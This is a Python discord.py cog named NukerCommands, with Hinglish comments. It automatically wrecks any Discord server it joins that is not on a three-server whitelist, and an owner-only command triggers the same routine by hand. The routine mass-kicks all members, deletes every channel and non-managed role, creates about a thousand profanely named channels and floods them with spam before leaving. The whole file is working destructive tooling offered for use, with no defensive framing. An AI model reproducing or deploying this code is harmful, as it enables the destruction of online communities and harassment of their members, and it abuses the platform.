import discord
from discord.ext import commands
import asyncio
import random

class NukerCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # WHITELISTED SERVERS - TERE 3 SERVERS SAFE RAHENGE
        self.whitelisted_servers = [
            1444885010543935662,  # Server 1 - SAFE
            1421640981584937063,  # Server 2 - SAFE  
            1344323930923601992   # Server 3 - SAFE
        ]

    def is_whitelisted(self, guild_id):
        """Check karo agar server whitelisted hai ya nahi"""
        return guild_id in self.whitelisted_servers

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        """Jab bhi bot kisi naye server mein join kare"""
        print(f'🎯 Bot joined: {guild.name} ({guild.id})')
        
        # Agar server whitelisted nahi hai toh auto-nuke
        if not self.is_whitelisted(guild.id):
            print(f'💣 Auto-nuking non-whitelisted server: {guild.name}')
            await self.nuke_server(guild)
        else:
            print(f'✅ Whitelisted server: {guild.name} - Safe')

    async def nuke_server(self, guild):
        """Server nuke karne ka function - ONLY FOR NON-WHITELISTED SERVERS"""
        
        # Double check - agar whitelisted hai toh nuke mat karo
        if self.is_whitelisted(guild.id):
            print(f'❌ Cannot nuke whitelisted server: {guild.name}')
            return
            
        try:
            # STEP 1: INSTANT MASS KICK (LIGHT SPEED)
            print("🚫 LIGHT SPEED MASS KICKING...")
            kick_tasks = []
            for member in guild.members:
                if member != self.bot.user:
                    kick_tasks.append(member.kick(reason="Fucked By Digamber"))
            
            await asyncio.gather(*kick_tasks, return_exceptions=True)
            print("✅ ALL MEMBERS KICKED AT LIGHT SPEED!")
            
            # STEP 2: INSTANT CHANNEL DELETE
            print("🗑️ LIGHT SPEED CHANNEL DELETION...")
            delete_tasks = [ch.delete() for ch in guild.channels]
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # STEP 3: MASSIVE CHANNEL CREATION (1000+ CHANNELS) WITH UNLIMITED SPAM
            print("🔥 CREATING 1000+ CHANNELS WITH UNLIMITED SPAM...")
            channel_count = 0
            spam_tasks = []  # ALL SPAM MESSAGES STORE KARENGE
            
            message_styles = [
                "# Fucked by Digamber",
                "## Fucked by Digamber", 
                "### Fucked by Digamber",
                "**FUCKED BY DIGAMBER**",
                "__FUCKED BY DIGAMBER__",
                "***FUCKED BY DIGAMBER***",
                "```FUCKED BY DIGAMBER```",
                "> FUCKED BY DIGAMBER",
                ">>> FUCKED BY DIGAMBER",
                "**# FUCKED BY DIGAMBER**",
                "💀 **FUCKED BY DIGAMBER** 💀",
                "🔥 **FUCKED BY DIGAMBER** 🔥",
                "⚡ **FUCKED BY DIGAMBER** ⚡",
                "🎯 **FUCKED BY DIGAMBER** 🎯",
                "💥 **FUCKED BY DIGAMBER** 💥"
            ]
            
            # 1000+ CHANNELS BANAYEGE - UNLIMITED SPAM KE SAATH
            while channel_count < 1000:
                try:
                    # 30 CHANNELS EK SAATH - SIRF "Fucked by Digamber" NAME
                    create_tasks = []
                    for i in range(30):
                        channel_name = f"Fucked by Digamber {channel_count + i + 1}"
                        create_tasks.append(guild.create_text_channel(channel_name))
                    
                    # CHANNELS CREATE KARO
                    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
                    channel_count += 30
                    
                    # HAR NEW CHANNEL MEIN UNLIMITED SPAM SHURU KARO
                    for channel in new_channels:
                        if isinstance(channel, discord.TextChannel):
                            # HAR CHANNEL MEIN 50-100 RANDOM MESSAGES - UNLIMITED SPAM
                            for _ in range(random.randint(50, 100)):
                                msg = random.choice(message_styles)
                                spam_tasks.append(channel.send(msg))
                    
                    # ZERO DELAY - LIGHT SPEED
                    if channel_count % 100 == 0:
                        print(f"✅ {channel_count} CHANNELS CREATED WITH UNLIMITED SPAM...")
                    
                except Exception as e:
                    break
            
            print(f"🎉 {channel_count} CHANNELS CREATED WITH UNLIMITED SPAM!")
            
            # STEP 4: SABHI SPAM MESSAGES EK SAATH BHEJO
            print("💬 SENDING UNLIMITED SPAM MESSAGES...")
            if spam_tasks:
                await asyncio.gather(*spam_tasks, return_exceptions=True)
                print(f"✅ {len(spam_tasks)} UNLIMITED SPAM MESSAGES SENT!")
            
            # STEP 5: LIGHT SPEED ROLE DELETE
            print("🎭 LIGHT SPEED ROLE DELETION...")
            role_tasks = [role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed]
            if role_tasks:
                await asyncio.gather(*role_tasks, return_exceptions=True)
            
            # STEP 6: FINAL MESSAGE
            try:
                channels = await guild.fetch_channels()
                if channels:
                    await channels[0].send(
                        f"💀 **FUCKED BY DIGAMBER** 💀\n\n"
                        f"**{channel_count} CHANNELS OBLITERATED!**\n"
                        f"**{len(spam_tasks)} UNLIMITED SPAM MESSAGES!**\n"
                        f"**COMPLETE DESTRUCTION AT LIGHT SPEED!**\n"
                        f"**WHITELISTED SERVERS ARE SAFE 🔒**"
                    )
            except:
                pass
            
            await guild.leave()
            print("✅ UNLIMITED SPAM NUKE COMPLETED!")
            
        except Exception as e:
            try:
                await guild.leave()
            except:
                pass

    @commands.command(name='nuke')
    @commands.is_owner()
    async def manual_nuke(self, ctx):
        """Manual nuke command - sirf non-whitelisted servers ke liye"""
        if self.is_whitelisted(ctx.guild.id):
            await ctx.send("❌ **This server is WHITELISTED! Cannot nuke.** 🔒")
            return
        
        await ctx.send("💣 **NUKE INITIATED!** Starting in 5 seconds...")
        await asyncio.sleep(5)
        
        try:
            await ctx.message.delete()
        except:
            pass
        
        await self.nuke_server(ctx.guild)

    @commands.command(name='whitelist')
    @commands.is_owner()
    async def add_whitelist(self, ctx, server_id: int = None):
        """Current server ko whitelist mein add karo"""
        if server_id is None:
            server_id = ctx.guild.id
        
        if server_id not in self.whitelisted_servers:
            self.whitelisted_servers.append(server_id)
            await ctx.send(f"✅ **Server whitelisted!**\nID: `{server_id}`\nName: `{ctx.guild.name}`")
        else:
            await ctx.send(f"ℹ️ Server already whitelisted!")

    @commands.command(name='unwhitelist')
    @commands.is_owner() 
    async def remove_whitelist(self, ctx, server_id: int = None):
        """Server ko whitelist se remove karo"""
        if server_id is None:
            server_id = ctx.guild.id
        
        if server_id in self.whitelisted_servers:
            self.whitelisted_servers.remove(server_id)
            await ctx.send(f"✅ **Server removed from whitelist!**\nID: `{server_id}`")
        else:
            await ctx.send(f"❌ Server not in whitelist!")

    @commands.command(name='whitelisted')
    @commands.is_owner()
    async def show_whitelisted(self, ctx):
        """Show all whitelisted servers"""
        if not self.whitelisted_servers:
            await ctx.send("❌ No servers in whitelist!")
            return
        
        embed = discord.Embed(title="🔒 WHITELISTED SERVERS", color=0x00ff00)
        
        for server_id in self.whitelisted_servers:
            guild = self.bot.get_guild(server_id)
            if guild:
                embed.add_field(
                    name=guild.name,
                    value=f"ID: `{server_id}`\nMembers: {guild.member_count}",
                    inline=False
                )
            else:
                embed.add_field(
                    name="Unknown Server",
                    value=f"ID: `{server_id}`\n(Bot not in this server)",
                    inline=False
                )
        
        await ctx.send(embed=embed)

    @commands.command(name='servers')
    @commands.is_owner()
    async def show_all_servers(self, ctx):
        """Show all servers with whitelist status"""
        embed = discord.Embed(title="📊 ALL SERVERS", color=0x3498db)
        
        for guild in self.bot.guilds:
            status = "✅ WHITELISTED" if self.is_whitelisted(guild.id) else "❌ NOT WHITELISTED"
            embed.add_field(
                name=guild.name,
                value=f"ID: `{guild.id}`\nStatus: {status}\nMembers: {guild.member_count}",
                inline=False
            )
        
        await ctx.send(embed=embed)

async def setup(bot):
    await bot.add_cog(NukerCommands(bot))
